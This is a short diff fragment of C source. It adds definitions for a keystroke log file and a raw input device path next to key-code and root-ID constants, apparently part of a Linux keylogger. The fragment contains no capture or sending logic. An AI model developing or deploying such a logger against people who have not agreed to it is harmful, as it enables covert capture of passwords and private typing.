@@ -5,6 +5,8 @@
 #define RIGHTSHIFT 54
 #define CAPSLOCK 58
 #define ROOTID 0
+#define LOGFILE "/var/log/keystroke.log"
+#define DEVICEFILE "/dev/input/event4"
 
 // declarations
 typedef struct input_event input_event;
